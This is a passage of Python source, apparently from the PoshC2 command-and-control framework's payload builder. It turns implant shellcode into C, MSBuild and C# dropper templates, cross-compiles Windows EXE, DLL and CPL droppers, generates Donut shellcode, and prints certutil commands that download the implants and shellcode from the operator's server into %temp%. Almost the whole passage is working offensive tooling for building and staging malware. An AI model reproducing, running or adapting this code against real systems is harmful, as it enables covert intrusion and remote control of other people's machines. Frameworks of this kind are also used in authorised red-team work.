            with open("%s%sPosh_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)

        elif payloadtype == PayloadType.Sharp:
            # Get the Sharp shellcode
            with open("%s%sSharp_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            with open("%s%sSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)

        elif payloadtype == PayloadType.PBind:
            # Get the Posh shellcode
            with open("%s%sPBind_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            with open("%s%sPBind_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)

        elif payloadtype == PayloadType.PBindSharp:
            # Get the Sharp shellcode
            with open("%s%sPBindSharp_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            with open("%s%sPBindSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)

        elif payloadtype == PayloadType.FCommSharp:
            # Get the Sharp shellcode
            with open("%s%sFCommSharp_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            with open("%s%sFCommSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
                shellcodesrc = f.read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)

        # Create the raw C file from the template
        with open("%s%s" % (PayloadTemplatesDirectory, sourcefile), 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEME#", str(shellcode64)) \
            .replace("#REPLACEMEPROCESS#", migrate_process)
        with open("%s%s%s_%s_x64.c" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", "")), 'w') as f:
            f.write(content)

        # Create the raw C file from the template
        with open("%s%s" % (PayloadTemplatesDirectory, sourcefile), 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEME#", str(shellcode32)) \
            .replace("#REPLACEMEPROCESS#", migrate_process)
        with open("%s%s%s_%s_x86.c" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", "")), 'w') as f:
            f.write(content)

        # Compile the exe or dll depinding if there is a dllmain and process_attach
        if sourcefile.lower().endswith(".dll.c"):
            sourcefile = sourcefile.replace(".c", "")
            subprocess.check_output("x86_64-w64-mingw32-gcc -w -shared %s%s%s_%s_x64.c -o %s%s%s_%s_x64.dll" % (self.BaseDirectory, name, payloadtype.value, sourcefile, self.BaseDirectory, name, payloadtype.value, sourcefile), shell=True)
            subprocess.check_output("i686-w64-mingw32-gcc -w -shared %s%s%s_%s_x86.c -o %s%s%s_%s_x86.dll" % (self.BaseDirectory, name, payloadtype.value, sourcefile, self.BaseDirectory, name, payloadtype.value, sourcefile), shell=True)
            self.QuickstartLog("Payload written to: %s%s%s_%s_x64.dll" % (self.BaseDirectory, name, payloadtype.value, sourcefile))
            self.QuickstartLog("Payload written to: %s%s%s_%s_x86.dll" % (self.BaseDirectory, name, payloadtype.value, sourcefile))
            if "CPlApplet" in content:
                shutil.copy(f"{self.BaseDirectory}{name}{payloadtype.value}_{sourcefile}_x64.dll", f"{self.BaseDirectory}{name}{payloadtype.value}_{sourcefile}_x64.dll.cpl")
                shutil.copy(f"{self.BaseDirectory}{name}{payloadtype.value}_{sourcefile}_x86.dll", f"{self.BaseDirectory}{name}{payloadtype.value}_{sourcefile}_x86.dll.cpl")
                self.QuickstartLog("Payload written to: %s%s%s_%s_x64.dll.cpl" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", "")))
                self.QuickstartLog("Payload written to: %s%s%s_%s_x86.dll.cpl" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", "")))
        else:
            subprocess.check_output("x86_64-w64-mingw32-gcc -w %s%s%s_%s_x64.c -o %s%s%s_%s_x64.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", ""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", "")), shell=True)
            subprocess.check_output("i686-w64-mingw32-gcc -w %s%s%s_%s_x86.c -o %s%s%s_%s_x86.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", ""), self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", "")), shell=True)
            self.QuickstartLog("Payload written to: %s%s%s_%s_x64.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", "")))
            self.QuickstartLog("Payload written to: %s%s%s_%s_x86.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c", "")))

    def CreateMsbuild(self, name="", pbindOnly=False):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Msbuild payload files:")

        for Payload in PayloadType:
            if not pbindOnly:
                self.CreateMsbuildFiles(Payload, name)
            if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
                self.CreateMsbuildFiles(Payload, name)

    def CreateCsc(self, name="", pbindOnly=False):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("CSC payload files:")

        for Payload in PayloadType:
            if not pbindOnly:
                self.CreateCSCFiles(Payload, name)
            if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
                self.CreateCSCFiles(Payload, name)

    def CreateMsbuildFiles(self, payloadtype, name=""):
        self.QuickstartLog("Payload written to: %s%s%s_msbuild.xml" % (self.BaseDirectory, name, payloadtype.value))

        if payloadtype == PayloadType.Posh_v2:
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Posh_v4:
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Sharp:
            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.PBind:
            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.PBindSharp:
            with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.FCommSharp:
            with open("%s%s" % (self.BaseDirectory, name + "FCommSharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()

        x86base64 = base64.b64encode(x86base64)
        x64base64 = base64.b64encode(x64base64)

        with open("%smsbuild.xml" % (PayloadTemplatesDirectory), 'r') as f:
            msbuild = f.read()
        msbuild = str(msbuild) \
            .replace("#REPLACEME32#", x86base64.decode('UTF-8')) \
            .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
            .replace("#REPLACEMERANDSTRING#", str(randomuri()))

        with open("%s%s%s_msbuild.xml" % (self.BaseDirectory, name, payloadtype.value), 'w') as f:
            f.write(msbuild)

    def CreateCSCFiles(self, payloadtype, name=""):
        self.QuickstartLog("Payload written to: %s%s%s_csc.cs" % (self.BaseDirectory, name, payloadtype.value))

        if payloadtype == PayloadType.Posh_v2:
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Posh_v4:
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.Sharp:
            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.PBind:
            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.PBindSharp:
            with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()
        elif payloadtype == PayloadType.FCommSharp:
            with open("%s%s" % (self.BaseDirectory, name + "FCommSharp_v4_x86_Shellcode.bin"), "rb") as f:
                x86base64 = f.read()
            with open("%s%s" % (self.BaseDirectory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
                x64base64 = f.read()

        x86base64 = base64.b64encode(x86base64)
        x64base64 = base64.b64encode(x64base64)

        with open("%scsc.cs" % (PayloadTemplatesDirectory), 'r') as f:
            content = f.read()
        content = str(content) \
            .replace("#REPLACEME32#", x86base64.decode('UTF-8')) \
            .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
            .replace("#REPLACEMERANDSTRING#", str(randomuri()))

        with open("%s%s%s_csc.cs" % (self.BaseDirectory, name, payloadtype.value), 'w') as f:
            f.write(content)

    def CreateDynamicCodeTemplate(self, name=""):
        with open(f"{PayloadTemplatesDirectory}DynamicCode.cs", "r") as template:
            with open(f"{self.BaseDirectory}DynamicCode.cs", "w") as payload:
                payload.write(template.read())

    def CreateDonutShellcode(self, name="", pbindOnly=False):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Donut shellcode files:")
        for Payload in PayloadType:
            if not pbindOnly:
                self.CreateDonutShellcodeFile(Payload, name)
            if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
                self.CreateDonutShellcodeFile(Payload, name)

    def CreateDonutShellcodeFile(self, payloadtype, name=""):
        if payloadtype == PayloadType.Posh_v2:
            sourcefile = "dropper_cs_ps_v2.exe"
        elif payloadtype == PayloadType.Posh_v4:
            sourcefile = "dropper_cs_ps_v4.exe"
        elif payloadtype == PayloadType.PBind:
            sourcefile = "dropper_cs_ps_pbind_v4.exe"
        elif payloadtype == PayloadType.Sharp:
            sourcefile = "dropper_cs.exe"
        elif payloadtype == PayloadType.PBindSharp:
            sourcefile = "pbind_cs.exe"
        elif payloadtype == PayloadType.FCommSharp:
            sourcefile = "fcomm_cs.exe"


        shellcode32 = donut.create(file=f"{self.BaseDirectory}{name}{sourcefile}", arch=1)
        if shellcode32:
            output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x86_Shellcode.bin", 'wb')
            output_file.write(shellcode32)
            output_file.close()
            self.QuickstartLog("Payload written to: %s%s%s_Donut_x86_Shellcode.b64" % (self.BaseDirectory, name, payloadtype.value))
            output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x86_Shellcode.b64", 'w')
            output_file.write(base64.b64encode(shellcode32).decode("utf-8"))
            output_file.close()
            self.QuickstartLog("Payload written to: %s%s%s_Donut_x86_Shellcode.bin" % (self.BaseDirectory, name, payloadtype.value))

        shellcode64 = donut.create(file=f"{self.BaseDirectory}{name}{sourcefile}", arch=2)
        if shellcode64:
            output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x64_Shellcode.bin", 'wb')
            output_file.write(shellcode64)
            output_file.close()
            self.QuickstartLog("Payload written to: %s%s%s_Donut_x64_Shellcode.b64" % (self.BaseDirectory, name, payloadtype.value))

            output_file = open(f"{self.BaseDirectory}{name}{payloadtype.value}_Donut_x64_Shellcode.b64", 'w')
            output_file.write(base64.b64encode(shellcode64).decode("utf-8"))
            output_file.close()
            self.QuickstartLog("Payload written to: %s%s%s_Donut_x64_Shellcode.bin" % (self.BaseDirectory, name, payloadtype.value))

    def CreateAll(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog(Colours.END + "Payloads/droppers using powershell.exe:" + Colours.END)
        self.QuickstartLog(Colours.END + "=======================================" + Colours.END)
        self.CreateRaw(name)
        self.CreateHTA(name)
        self.CreateSCT(name)

        self.QuickstartLog(Colours.END)
        self.QuickstartLog(Colours.END + "Payloads/droppers using shellcode:" + Colours.END)
        self.QuickstartLog(Colours.END + "==================================" + Colours.END)
        self.CreateDroppers(name)
        self.CreateDlls(name)
        self.CreateShellcode(name)
        self.CreateDotNet2JS(name)
        self.CreateEXE(name)
        self.CreateMsbuild(name)
        self.CreateCsc(name)
        self.CreateDonutShellcode(name)
        self.CreateJXA(name)

        self.CreatePython(name)
        self.CreateDynamicCodeTemplate(name)

        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Download Posh64 & Posh32 executables using certutil:" + Colours.GREEN)
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (f"{self.FirstURL}/{self.QuickCommand}_ex86", randomuri()))
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (f"{self.FirstURL}/{self.QuickCommand}_ex64", randomuri()))

        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Download Posh/Sharp x86 and x64 shellcode from the webserver:" + Colours.GREEN)
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" %
                           (f"{self.FirstURL}/{self.QuickCommand}s/64/portal", randomuri()))
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" %
                           (f"{self.FirstURL}/{self.QuickCommand}s/86/portal", randomuri()))
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" %
                           (f"{self.FirstURL}/{self.QuickCommand}p/64/portal", randomuri()))
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" %
                           (f"{self.FirstURL}/{self.QuickCommand}p/86/portal", randomuri()))

        self.QuickstartLog(Colours.END)
        self.QuickstartLog(f"pbind-connect hostname {self.PBindPipeName} {self.PBindSecret}")
        self.BuildDynamicPayloads(name)

    def CreatePbind(self, name):    
        self.QuickstartLog(Colours.END)
        self.QuickstartLog(Colours.END + "Creating new PBind payloads:" + Colours.END)
        self.QuickstartLog(Colours.END + "============================" + Colours.END)
        self.CreateDroppers(name, pbindOnly=True)
        self.CreateDlls(name, pbindOnly=True)
        self.CreateShellcode(name, pbindOnly=True)
        self.CreateDotNet2JS(name, pbindOnly=True)
        self.CreateEXE(name, pbindOnly=True)
        self.CreateMsbuild(name, pbindOnly=True)
        self.CreateCsc(name, pbindOnly=True)
        self.CreateDonutShellcode(name, pbindOnly=True)

        self.QuickstartLog(Colours.END)
        self.QuickstartLog(f"pbind-connect hostname {self.PBindPipeName} {self.PBindSecret}")
    
    def BuildLinuxPayloads(self, name):

        for payload_module_file in os.listdir(PayloadModulesDirectory):
            if not payload_module_file.endswith("Linux.py"):
                continue
            if __file__.endswith(f"/{payload_module_file}") or payload_module_file == "__init__.py":
                continue
            payload_module = os.path.splitext(payload_module_file)[0]
            module = importlib.import_module(f'poshc2.server.payloads.{payload_module}')
            shellcode_function = getattr(module, "create_payloads")
            shellcode_function(self, name)

    def BuildDynamicPayloads(self, name):

        for payload_module_file in os.listdir(PayloadModulesDirectory):
            if not payload_module_file.endswith(".py"):
                continue
            if __file__.endswith(f"/{payload_module_file}") or payload_module_file == "__init__.py":
                continue
            payload_module = os.path.splitext(payload_module_file)[0]
            module = importlib.import_module(f'poshc2.server.payloads.{payload_module}')
            shellcode_function = getattr(module, "create_payloads")
            shellcode_function(self, name)
